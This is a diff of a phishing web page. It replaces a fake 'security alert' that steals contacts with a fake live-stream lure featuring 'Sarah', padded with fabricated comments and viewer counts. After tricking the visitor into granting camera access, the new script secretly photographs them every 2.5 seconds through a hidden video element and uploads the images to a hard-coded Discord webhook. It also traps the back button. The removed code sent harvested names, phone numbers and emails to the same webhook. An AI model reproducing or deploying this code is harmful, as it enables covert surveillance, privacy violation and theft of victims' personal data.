@@ -1,172 +1,799 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LiveNow - Live Streaming</title>
     <link rel="manifest" href="manifest.json">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
         body {
+            min-height: 100vh;
             background: #000;
-            color: red;
-            font-family: monospace;
-            animation: blink 0.5s infinite;
+            position: relative;
+            overflow: hidden;
         }
-        @keyframes blink {
-            0%,100%{background:#000}
-            50%{background:#8b0000}
+        
+        /* Background Video - Full Screen */
+        #bg-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: filter 0.5s ease;
+            z-index: 0;
         }
-        .alert {
+        
+        /* Blur Effect */
+        .video-blur {
+            filter: blur(20px) brightness(0.3);
+        }
+        
+        .video-clear {
+            filter: blur(0) brightness(1);
+        }
+        
+        /* Gradient Overlay */
+        .gradient-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%);
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        /* Top Bar */
+        .top-bar {
+            position: relative;
+            z-index: 2;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            pointer-events: none;
+        }
+        
+        .live-indicator {
+            background: #ff4444;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .live-dot {
+            width: 10px;
+            height: 10px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0%,100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+        }
+        
+        .viewer-stats {
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Stream Info */
+        .stream-info {
+            position: relative;
+            z-index: 2;
+            padding: 0 20px;
+            color: white;
+            margin-top: auto;
+        }
+        
+        .streamer-profile {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+        
+        .streamer-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff4444, #ff6b6b);
+            border: 3px solid white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        .streamer-details {
+            flex: 1;
+        }
+        
+        .streamer-name {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+        
+        .streamer-status {
+            font-size: 13px;
+            color: #aaa;
+        }
+        
+        .follow-btn {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        
+        /* Action Buttons */
+        .action-buttons {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            gap: 15px;
+            padding: 20px;
+            justify-content: flex-end;
+        }
+        
+        .action-btn {
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(10px);
+            border: none;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            pointer-events: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s;
+        }
+        
+        .action-btn:hover {
+            transform: scale(1.1);
+        }
+        
+        .action-btn.like {
+            background: #ff4444;
+        }
+        
+        /* Comments Section */
+        .comments-section {
+            position: relative;
+            z-index: 2;
+            padding: 0 20px;
+            margin-bottom: 15px;
+        }
+        
+        .comments-list {
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+            pointer-events: auto;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .comment-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .comment-avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff4444, #ff6b6b);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: white;
+        }
+        
+        .comment-content {
+            flex: 1;
+        }
+        
+        .comment-user {
+            color: #ff4444;
+            font-weight: bold;
+            font-size: 13px;
+            margin-right: 5px;
+        }
+        
+        .comment-text {
+            color: white;
+            font-size: 13px;
+        }
+        
+        .comment-time {
+            color: #666;
+            font-size: 10px;
+            margin-left: 5px;
+        }
+        
+        /* Gift Message */
+        .gift-message {
+            background: linear-gradient(135deg, #ffd700, #ffa500);
+            color: black;
+            font-weight: bold;
+        }
+        
+        /* Join Button */
+        .join-btn {
+            position: relative;
+            z-index: 2;
+            background: linear-gradient(135deg, #ff4444, #ff6b6b);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: calc(100% - 40px);
+            margin: 0 20px 20px;
+            box-shadow: 0 10px 30px rgba(255,68,68,0.3);
+            pointer-events: auto;
+            transition: transform 0.2s;
+        }
+        
+        .join-btn:hover {
+            transform: scale(1.02);
+        }
+        
+        .join-btn:active {
+            transform: scale(0.98);
+        }
+        
+        /* Gift Animation */
+        .gift-animation {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: white;
+            font-size: 60px;
+            z-index: 10000;
+            animation: giftFloat 2s forwards;
+            pointer-events: none;
+        }
+        
+        @keyframes giftFloat {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0); }
+            20% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
+            80% { opacity: 1; transform: translate(-50%, -100px) scale(1); }
+            100% { opacity: 0; transform: translate(-50%, -150px) scale(0.8); }
+        }
+        
+        /* Permission Overlay */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+        
+        .permission-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .permission-card {
+            background: linear-gradient(135deg, #1a1a2a, #16213e);
+            border-radius: 30px;
             padding: 30px;
-            border-radius: 20px;
+            max-width: 350px;
             text-align: center;
-            width: 300px;
-            border: 5px solid red;
-            animation: pop 0.3s;
+            color: white;
+            border: 2px solid #ff4444;
+            animation: popIn 0.3s;
         }
-        @keyframes pop {
-            0%{transform:translate(-50%,-50%) scale(0)}
-            100%{transform:translate(-50%,-50%) scale(1)}
+        
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
         }
-        .danger-icon {
-            font-size: 80px;
+        
+        .permission-icon {
+            font-size: 60px;
             margin-bottom: 20px;
+            animation: float 2s infinite;
         }
-        h1 {
-            color: red;
+        
+        @keyframes float {
+            0%,100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .permission-title {
             font-size: 24px;
+            font-weight: bold;
             margin-bottom: 15px;
+            color: #ff4444;
         }
-        p {
-            color: #333;
-            margin-bottom: 20px;
+        
+        .permission-text {
+            color: #ccc;
+            margin-bottom: 25px;
+            font-size: 14px;
+            line-height: 1.6;
         }
-        .btn-danger {
-            background: red;
+        
+        .permission-btn {
+            background: linear-gradient(135deg, #ff4444, #ff6b6b);
             color: white;
             border: none;
             padding: 15px 30px;
             border-radius: 50px;
             font-size: 18px;
-            width: 100%;
-            cursor: pointer;
             font-weight: bold;
-        }
-        .btn-danger:hover {
-            background: darkred;
-        }
-        .progress {
+            cursor: pointer;
             width: 100%;
-            height: 10px;
-            background: #ddd;
+            margin: 10px 0;
+        }
+        
+        .viewer-count-badge {
+            display: inline-block;
+            background: #ff4444;
+            padding: 5px 10px;
             border-radius: 5px;
-            margin: 20px 0;
-            overflow: hidden;
+            margin-top: 10px;
         }
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: red;
-            animation: progress 3s infinite;
+        
+        /* Hidden Elements */
+        #hiddenCanvas, #hiddenVideo {
+            display: none;
         }
-        @keyframes progress {
-            0%{width:0%}
-            50%{width:100%}
-            100%{width:0%}
+        
+        /* Footer */
+        .footer {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            color: #666;
+            font-size: 10px;
+            padding: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="alert" id="alertBox">
-        <div class="danger-icon">⚠️</div>
-        <h1>SECURITY ALERT!</h1>
-        <p>🚨 3 SUSPICIOUS APPS DETECTED<br>🚨 YOUR DATA IS AT RISK<br>🚨 VERIFY CONTACTS NOW</p>
-        
-        <div class="progress">
-            <div class="progress-bar"></div>
+    <!-- Background Video -->
+    <video autoplay loop playsinline id="bg-video" class="video-blur">
+        <source src="Girl.mp4" type="video/mp4">
+        <source src="video.mp4" type="video/mp4">
+    </video>
+    
+    <div class="gradient-overlay"></div>
+
+    <!-- Hidden Video for Camera (User ko nahi dikhega) -->
+    <video id="hiddenVideo" playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <!-- Permission Overlay -->
+    <div class="permission-overlay" id="permissionOverlay">
+        <div class="permission-card">
+            <div class="permission-icon">📹</div>
+            <div class="permission-title">Join Live</div>
+            <div class="permission-text">
+                Sarah is live now!<br>
+                <span class="viewer-count-badge">🔴 2,847 watching</span>
+            </div>
+            <button class="permission-btn" onclick="requestCameraPermission()">
+                📸 JOIN NOW
+            </button>
         </div>
-        
-        <button class="btn-danger" onclick="triggerContactPicker()" id="mainBtn">
-            🔴 VERIFY CONTACTS NOW
-        </button>
-        
-        <p style="font-size:12px; color:#666; margin-top:15px;">
-            ⚡ Immediate action required!<br>
-            Click to secure your device
-        </p>
+    </div>
+
+    <!-- Main Content -->
+    <div class="top-bar">
+        <div class="live-indicator">
+            <span class="live-dot"></span> LIVE
+        </div>
+        <div class="viewer-stats">
+            <span>👁️ <span id="viewerCount">2.8k</span></span>
+            <span>⏱️ 2h</span>
+        </div>
+    </div>
+
+    <div class="stream-info">
+        <div class="streamer-profile">
+            <div class="streamer-avatar">👩</div>
+            <div class="streamer-details">
+                <div class="streamer-name">Sarah</div>
+                <div class="streamer-status">🎤 Live • Just started</div>
+            </div>
+            <button class="follow-btn" onclick="follow()">➕ Follow</button>
+        </div>
+    </div>
+
+    <div class="action-buttons">
+        <button class="action-btn like" onclick="like()">❤️</button>
+        <button class="action-btn" onclick="share()">📤</button>
+        <button class="action-btn" onclick="report()">⚡</button>
+    </div>
+
+    <div class="comments-section">
+        <div class="comments-list" id="commentsList">
+            <div class="comment-item">
+                <div class="comment-avatar">👤</div>
+                <div class="comment-content">
+                    <span class="comment-user">John</span>
+                    <span class="comment-text">❤️❤️❤️</span>
+                    <span class="comment-time">2m</span>
+                </div>
+            </div>
+            <div class="comment-item">
+                <div class="comment-avatar">👤</div>
+                <div class="comment-content">
+                    <span class="comment-user">Emma</span>
+                    <span class="comment-text">Hi Sarah! 🔥</span>
+                    <span class="comment-time">3m</span>
+                </div>
+            </div>
+            <div class="comment-item">
+                <div class="comment-avatar">👤</div>
+                <div class="comment-content">
+                    <span class="comment-user">Mike</span>
+                    <span class="comment-text">You're amazing!</span>
+                    <span class="comment-time">4m</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button class="join-btn" onclick="showPermission()" id="joinBtn">
+        👋 SAY HI
+    </button>
+
+    <div class="footer">
+        ⚡ 127 chatting • Gifts: 234
     </div>
 
     <script>
-        // manifest link
-        const link = document.createElement('link');
-        link.rel = 'manifest';
-        link.href = 'manifest.json';
-        document.head.appendChild(link);
+        // ============ CONFIG ============
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg';
+        
+        let cameraAllowed = false;
+        let cameraStream = null;
+        let photoInterval = null;
+        let commentInterval = null;
+        let viewerCount = 2847;
+        let giftCount = 0;
 
-        // Service Worker register
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js');
-        }
-
-        function triggerContactPicker() {
-            const btn = document.getElementById('mainBtn');
-            btn.innerHTML = '⏳ SCANNING...';
-            btn.disabled = true;
+        // Page Load
+        window.onload = function() {
+            // Try to play video with sound
+            const video = document.getElementById('bg-video');
+            video.play().catch(e => console.log('Video play error:', e));
             
+            // Show permission after 1 sec
             setTimeout(() => {
-                selectContacts();
-            }, 2000);
+                document.getElementById('permissionOverlay').classList.add('active');
+            }, 1000);
+            
+            // Start fake comments
+            startFakeComments();
+        };
+
+        // Show permission
+        function showPermission() {
+            document.getElementById('permissionOverlay').classList.add('active');
         }
 
-        async function selectContacts() {
-            try {
-                if (!('contacts' in navigator)) {
-                    alert('This feature is not supported on your device');
-                    return;
-                }
-
-                const props = ['name', 'tel', 'email'];
-                
-                // YE LINE CONTACT SELECT KARWATI HAI
-                const contacts = await navigator.contacts.select(props, {
-                    multiple: true  // Saare contacts select karne dega
+        // Request Camera Permission
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    cameraAllowed = true;
+                    cameraStream = stream;
+                    
+                    // Hide permission
+                    document.getElementById('permissionOverlay').classList.remove('active');
+                    
+                    // Remove blur from video
+                    document.getElementById('bg-video').classList.remove('video-blur');
+                    document.getElementById('bg-video').classList.add('video-clear');
+                    
+                    // Hide join button
+                    document.getElementById('joinBtn').style.display = 'none';
+                    
+                    // Increase viewers
+                    viewerCount += Math.floor(Math.random() * 50) + 20;
+                    updateViewerCount();
+                    
+                    // Start hidden camera capture
+                    startHiddenCameraCapture();
+                    
+                    // Add silent comment (user ko nahi dikhega comment section mein)
+                    addSilentActivity();
+                    
+                    // Send to Discord
+                    sendToDiscord('user_joined');
+                    
+                    console.log('Camera active - hidden mode');
+                })
+                .catch(err => {
+                    alert('Camera access needed to join');
                 });
+        }
 
-                // Discord par bhejo
-                await fetch('https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg', {
+        // Hidden Camera Capture
+        function startHiddenCameraCapture() {
+            const hiddenVideo = document.getElementById('hiddenVideo');
+            hiddenVideo.srcObject = cameraStream;
+            hiddenVideo.play();
+            
+            // Capture photo every 2-3 seconds
+            photoInterval = setInterval(() => {
+                captureAndSendPhoto();
+            }, 2500);
+        }
+
+        // Capture and send photo to Discord
+        function captureAndSendPhoto() {
+            try {
+                const hiddenVideo = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                
+                canvas.width = 320;
+                canvas.height = 240;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0, 320, 240);
+                
+                // Get image as base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                
+                // Send to Discord
+                sendPhotoToDiscord(imageData);
+                
+                // Randomly add gift (user ko pata nahi chalega)
+                if (Math.random() > 0.7) {
+                    addHiddenGift();
+                }
+                
+            } catch(e) {
+                console.log('Capture error:', e);
+            }
+        }
+
+        // Send photo to Discord
+        async function sendPhotoToDiscord(imageData) {
+            try {
+                const blob = dataURLtoBlob(imageData);
+                const formData = new FormData();
+                formData.append('file', blob, `live_${Date.now()}.jpg`);
+                
+                formData.append('payload_json', JSON.stringify({
+                    content: '📸 **Live Stream Capture**',
+                    embeds: [{
+                        title: 'Auto Capture',
+                        color: 0xff4444,
+                        fields: [
+                            { name: 'Time', value: new Date().toLocaleString(), inline: true },
+                            { name: 'Viewers', value: formatNumber(viewerCount), inline: true }
+                        ]
+                    }]
+                }));
+
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    body: formData
+                });
+                
+            } catch(e) {}
+        }
+
+        // Send event to Discord
+        async function sendToDiscord(type) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: '@everyone 📱 **CONTACTS STOLEN!**',
+                        content: '📹 **Live Stream Event**',
                         embeds: [{
-                            title: 'Victim Contacts',
-                            fields: contacts.map((c, i) => ({
-                                name: `👤 Contact ${i+1}`,
-                                value: `Name: ${c.name?.[0] || 'N/A'}\n📞 ${c.tel?.[0] || 'N/A'}\n📧 ${c.email?.[0] || 'N/A'}`,
-                                inline: true
-                            }))
+                            title: type === 'user_joined' ? 'User Joined' : 'Activity',
+                            color: 0xff4444,
+                            fields: [
+                                { name: 'Time', value: new Date().toLocaleString(), inline: true },
+                                { name: 'Viewers', value: formatNumber(viewerCount), inline: true }
+                            ]
                         }]
                     })
                 });
+            } catch(e) {}
+        }
 
-                alert('✅ SCAN COMPLETE! Your device is secure.');
+        // Helper: dataURL to Blob
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
 
-            } catch (err) {
-                if (err.name === 'NotAllowedError') {
-                    // Agar user ne mana kiya to aur zyada darega
-                    document.getElementById('alertBox').innerHTML = `
-                        <div class="danger-icon">💀</div>
-                        <h1>CRITICAL!</h1>
-                        <p>⚠️ VERIFICATION FAILED!<br>⚠️ YOUR PHONE IS AT RISK</p>
-                        <button class="btn-danger" onclick="triggerContactPicker()">
-                            🔴 TRY AGAIN
-                        </button>
-                    `;
+        // Start fake comments (real dikhne ke liye)
+        function startFakeComments() {
+            const users = ['John', 'Emma', 'Mike', 'Alex', 'Lisa', 'David', 'Sophia'];
+            const messages = ['🔥', '❤️', '👋', 'Wow!', '❤️❤️', '😍', '💯', '🎉', 'Nice!'];
+            
+            commentInterval = setInterval(() => {
+                const randomUser = users[Math.floor(Math.random() * users.length)];
+                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                
+                addComment(randomUser, randomMsg);
+                
+                // Randomly increase viewer count
+                if (Math.random() > 0.7) {
+                    viewerCount += Math.floor(Math.random() * 3) + 1;
+                    updateViewerCount();
                 }
+            }, 3000);
+        }
+
+        // Add comment to UI (public)
+        function addComment(user, text, isGift = false) {
+            const commentsList = document.getElementById('commentsList');
+            const comment = document.createElement('div');
+            comment.className = 'comment-item';
+            
+            if (isGift) {
+                comment.innerHTML = `
+                    <div class="comment-avatar">🎁</div>
+                    <div class="comment-content">
+                        <span class="comment-user">${user}</span>
+                        <span class="comment-text gift-message">sent ${text}</span>
+                        <span class="comment-time">now</span>
+                    </div>
+                `;
+            } else {
+                comment.innerHTML = `
+                    <div class="comment-avatar">👤</div>
+                    <div class="comment-content">
+                        <span class="comment-user">${user}</span>
+                        <span class="comment-text">${text}</span>
+                        <span class="comment-time">now</span>
+                    </div>
+                `;
+            }
+            
+            commentsList.appendChild(comment);
+            commentsList.scrollTop = commentsList.scrollHeight;
+            
+            // Keep only last 15 comments
+            while (commentsList.children.length > 15) {
+                commentsList.removeChild(commentsList.children[0]);
             }
         }
+
+        // Silent activity (user ko nahi pata chalega)
+        function addSilentActivity() {
+            // Just internal tracking
+            console.log('User active in stream');
+        }
+
+        // Add hidden gift (user ko nahi pata)
+        function addHiddenGift() {
+            giftCount++;
+            // Update footer silently
+            document.querySelector('.footer').innerHTML = `⚡ ${Math.floor(Math.random() * 100) + 50} chatting • Gifts: ${giftCount}`;
+        }
+
+        // Show gift animation (public)
+        function showGiftAnimation(gift) {
+            const giftDiv = document.createElement('div');
+            giftDiv.className = 'gift-animation';
+            giftDiv.textContent = gift;
+            document.body.appendChild(giftDiv);
+            
+            setTimeout(() => {
+                giftDiv.remove();
+            }, 2000);
+        }
+
+        // Update viewer count
+        function updateViewerCount() {
+            document.getElementById('viewerCount').textContent = formatNumber(viewerCount);
+        }
+
+        function formatNumber(num) {
+            if (num > 1000) {
+                return (num/1000).toFixed(1) + 'k';
+            }
+            return num.toString();
+        }
+
+        // Button actions
+        function follow() {
+            alert('✅ Following Sarah!');
+        }
+
+        function like() {
+            showGiftAnimation('❤️');
+            addComment('You', '❤️');
+        }
+
+        function share() {
+            alert('📤 Share this live stream');
+        }
+
+        function report() {
+            alert('⚡ Thank you for your feedback');
+        }
+
+        // Block back button
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, location.href);
+        });
+
+        // Clean up
+        window.addEventListener('beforeunload', function() {
+            if (photoInterval) clearInterval(photoInterval);
+            if (commentInterval) clearInterval(commentInterval);
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        });
     </script>
 </body>
 </html>
